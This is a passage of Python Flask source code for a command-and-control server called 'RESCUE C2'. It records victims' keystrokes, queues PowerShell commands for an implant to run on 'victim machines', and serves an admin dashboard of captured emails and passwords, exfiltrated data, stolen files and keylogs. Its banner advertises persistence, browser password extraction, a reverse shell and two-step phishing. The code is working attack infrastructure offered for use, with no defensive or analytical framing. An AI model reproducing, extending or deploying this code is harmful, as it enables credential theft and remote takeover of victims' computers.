        conn.execute("INSERT INTO keylogs (data, ip, ts) VALUES (?, ?, ?)", 
                    (keylogs[:10000], request.remote_addr, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    return "OK"

# ====================================================================================================
# ADMIN COMMANDS
# ====================================================================================================
@app.route('/admin/command', methods=['POST'])
def admin_command():
    """Queue a command for execution on victims."""
    if not session.get('admin'):
        return "Unauthorized", 401
    
    command = request.form.get('command', '')
    if command:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("INSERT INTO tasks (command, status, ts) VALUES (?, 'pending', ?)", 
                    (command, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        tg(f"⚡ Command queued: {command}")
        return "Command queued"
    return "No command", 400

# ====================================================================================================
# ADMIN PANEL
# ====================================================================================================
def html_escape(value):
    if value is None:
        return 'N/A'
    return html_module.escape(str(value))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        p = request.form.get('p', '')
        if hmac.compare_digest(p, ADMIN_PASSWORD):
            session['admin'] = True
        else:
            return '<div style="color:red;text-align:center;padding:20px">Invalid password</div>' + _admin_login_form()
    
    if not session.get('admin'):
        return _admin_login_form()
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 50").fetchall()
    sessions = conn.execute("SELECT * FROM rescue_sessions ORDER BY id DESC LIMIT 20").fetchall()
    exfil = conn.execute("SELECT * FROM exfil ORDER BY id DESC LIMIT 10").fetchall()
    files = conn.execute("SELECT * FROM files ORDER BY id DESC LIMIT 10").fetchall()
    keylogs = conn.execute("SELECT * FROM keylogs ORDER BY id DESC LIMIT 10").fetchall()
    results = conn.execute("SELECT * FROM results ORDER BY id DESC LIMIT 10").fetchall()
    conn.close()
    
    # Build HTML rows
    creds_rows = ''
    for c in creds:
        creds_rows += f'<tr><td style="color:#00ff88">{html_escape(c[2])}</td><td style="color:#ffd700">{html_escape(c[3])}</td><td style="color:#00b3b0">{html_escape(c[4])}</td><td>{html_escape(c[5])}</td><td style="color:#888">{html_escape(c[6][:16] if c[6] else "N/A")}</td></tr>'
    
    sessions_rows = ''
    for s in sessions:
        status_color = '#00ff88' if s[5] == 'active' else '#ffd700'
        sessions_rows += f'<tr><td style="color:#00b3b0">{html_escape(s[1])}</td><td style="color:#ffd700">{html_escape(s[2])}</td><td>{html_escape(s[3])}</td><td style="color:{status_color}">{html_escape(s[5])}</td><td style="color:#888">{html_escape(s[6][:16] if s[6] else "N/A")}</td></tr>'
    
    exfil_rows = ''
    for e in exfil[:5]:
        exfil_rows += f'<tr><td style="color:#00b3b0">{html_escape(e[1][:50])}</td><td>{html_escape(e[2])}</td><td style="color:#888">{html_escape(e[3][:16] if e[3] else "N/A")}</td></tr>'
    
    files_rows = ''
    for f in files[:5]:
        files_rows += f'<tr><td style="color:#00ff88">{html_escape(f[1])}</td><td>{html_escape(f[2])}</td><td style="color:#888">{html_escape(f[3][:16] if f[3] else "N/A")}</td></tr>'
    
    keylog_rows = ''
    for k in keylogs[:5]:
        keylog_rows += f'<tr><td style="color:#ffd700">{html_escape(k[1][:50])}</td><td>{html_escape(k[2])}</td><td style="color:#888">{html_escape(k[3][:16] if k[3] else "N/A")}</td></tr>'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>RESCUE C2 - Command Center</title>
    <meta charset="UTF-8">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:#0a0c10;color:#e0e0e0;font-family:'Courier New',monospace;padding:24px}}
        h1{{color:#00b3b0;font-size:32px;margin-bottom:8px}}
        h2{{color:#ffd700;margin:24px 0 16px;font-size:20px;border-bottom:1px solid #2a2f3e;padding-bottom:8px}}
        .stats{{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin-bottom:30px}}
        .stat-card{{background:#1a1e24;padding:20px;border-radius:16px;border-left:3px solid #00b3b0}}
        .stat-number{{font-size:48px;font-weight:bold;color:#00b3b0}}
        .stat-label{{color:#6c7293;margin-top:8px;font-size:12px}}
        table{{border-collapse:collapse;width:100%;margin-top:15px}}
        th,td{{padding:12px;border-bottom:1px solid #2a2f3e;text-align:left;font-size:13px}}
        th{{color:#00b3b0;border-bottom:2px solid #00b3b0;font-weight:bold}}
        tr:hover{{background:#1a1e24}}
        .footer{{margin-top:40px;text-align:center;color:#6c7293;font-size:11px;padding:20px;border-top:1px solid #2a2f3e}}
        .status-green{{color:#00ff88}}
        .nav{{display:flex;gap:16px;margin:16px 0 24px;flex-wrap:wrap}}
        .nav a{{color:#6c7293;text-decoration:none;font-size:12px;padding:4px 12px;border:1px solid #2a2f3e;border-radius:20px}}
        .nav a:hover{{color:#00b3b0;border-color:#00b3b0}}
        .command-box{{background:#1a1e24;padding:16px;border-radius:12px;margin:16px 0}}
        .command-box input{{background:#0a0c10;border:2px solid #2a2f3e;border-radius:8px;color:#00b3b0;padding:10px;width:70%;font-family:'Courier New',monospace}}
        .command-box button{{background:#00b3b0;color:#0a0c10;border:none;border-radius:8px;padding:10px 20px;font-weight:bold;cursor:pointer}}
        .command-box button:hover{{background:#00d4d0}}
    </style>
    </head>
    <body>
        <h1>🖥️ RESCUE C2</h1>
        <p style="color:#6c7293;margin-bottom:20px">Full Takeover Edition • Zero Download</p>
        
        <div class="nav">
            <a href="#creds">Credentials</a>
            <a href="#sessions">Sessions</a>
            <a href="#exfil">Exfil</a>
            <a href="#files">Files</a>
            <a href="#keylogs">Keylogs</a>
            <a href="/health">Status</a>
            <a href="/">Landing</a>
        </div>
        
        <div class="command-box">
            <h3 style="color:#00b3b0;margin-bottom:8px">⚡ Execute Command</h3>
            <form method="POST" action="/admin/command">
                <input type="text" name="command" placeholder="Enter PowerShell command..." required style="width:70%">
                <button type="submit">Execute</button>
            </form>
            <div style="font-size:11px;color:#6c7293;margin-top:8px">
                Commands will be executed on victim machines via the implant
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-card"><div class="stat-number">{len(creds)}</div><div class="stat-label">Credentials</div></div>
            <div class="stat-card"><div class="stat-number">{len(sessions)}</div><div class="stat-label">Sessions</div></div>
            <div class="stat-card"><div class="stat-number">{len(files)}</div><div class="stat-label">Files Stolen</div></div>
            <div class="stat-card"><div class="stat-number">{len(keylogs)}</div><div class="stat-label">Keylogs</div></div>
        </div>
        
        <h2 id="creds">🔐 Captured Credentials</h2>
        <table><tr><th>Email</th><th>Password</th><th>Company</th><th>IP</th><th>Time</th></tr>{creds_rows}</table>
        
        <h2 id="sessions">🖥️ Rescue Sessions</h2>
        <table><tr><th>Session ID</th><th>PIN</th><th>Ref</th><th>Status</th><th>Time</th></tr>{sessions_rows}</table>
        
        <h2 id="exfil">📡 Exfiltrated Data</h2>
        <table><tr><th>Data</th><th>IP</th><th>Time</th></tr>{exfil_rows}</table>
        
        <h2 id="files">📁 Stolen Files</h2>
        <table><tr><th>Filename</th><th>Size</th><th>Time</th></tr>{files_rows}</table>
        
        <h2 id="keylogs">⌨️ Keylogs</h2>
        <table><tr><th>Data</th><th>IP</th><th>Time</th></tr>{keylog_rows}</table>
        
        <div class="footer">
            RESCUE C2 v2026 | Full Takeover Edition<br>
            Status: <span class="status-green">● OPERATIONAL</span> | 2-STEP PHISHING | PERSISTENCE | PASSWORD DUMP<br>
            🚀 Zero Download • Opens in Browser • No Installation Required
        </div>
    </body>
    </html>
    '''

def _admin_login_form():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Admin Login</title>
    <style>
        body{background:#0a0c10;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Courier New',monospace;margin:0;padding:20px}
        .card{background:#1a1e24;padding:40px;border-radius:20px;width:100%;max-width:360px;border:2px solid #00b3b0}
        h2{color:#00b3b0;margin-bottom:10px;text-align:center;font-size:24px}
        p{color:#6c7293;text-align:center;margin-bottom:24px;font-size:12px}
        input{width:100%;padding:14px;margin:10px 0;background:#0a0c10;border:2px solid #2a2f3e;border-radius:12px;color:#00b3b0;font-family:'Courier New',monospace;font-size:14px;box-sizing:border-box}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:#0a0c10;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:14px;font-family:'Courier New',monospace}
        button:hover{background:#00d4d0}
    </style>
    </head>
    <body>
        <div class="card">
            <h2>🖥️ RESCUE C2</h2>
            <p>Authorized Personnel Only</p>
            <form method="POST">
                <input type="password" name="p" placeholder="Enter admin password" required autofocus>
                <button type="submit">ACCESS DASHBOARD</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({
        "status": "operational",
        "version": "RESCUE C2 2026 - Full Takeover",
        "features": [
            "Zero Download Remote Control",
            "Persistence (survives reboots)",
            "Password Extraction",
            "File Exfiltration",
            "Command Execution",
            "Screenshot Capture",
            "Keylogging",
            "Reverse Shell"
        ]
    })

# ====================================================================================================
# DATABASE
# ====================================================================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS creds 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, step INTEGER, email TEXT, 
                  password TEXT, company TEXT, ip TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS rescue_sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, pin TEXT, 
                  ref TEXT, ip TEXT, status TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS exfil
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, ip TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS files
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, filename TEXT, size INTEGER, ip TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, ip TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, command TEXT, status TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, ip TEXT, ts TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ====================================================================================================
# MAIN
# ====================================================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🖥️  RESCUE C2 v2026 - FULL TAKEOVER EDITION                      ║
║                                                                      ║
║   ✅ Zero Download Remote Control                                   ║
║   ✅ Persistence (survives reboots)                                ║
║   ✅ Password Extraction (Chrome, Firefox, Windows)               ║
║   ✅ File Exfiltration                                             ║
║   ✅ Command Execution                                             ║
║   ✅ Screenshot Capture                                            ║
║   ✅ Keylogging                                                     ║
║   ✅ Reverse Shell                                                 ║
║                                                                      ║
║   Serving on http://0.0.0.0:{port}                                   ║
║   Admin:  http://localhost:{port}/admin                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")
    app.run(host='0.0.0.0', port=port, debug=False)
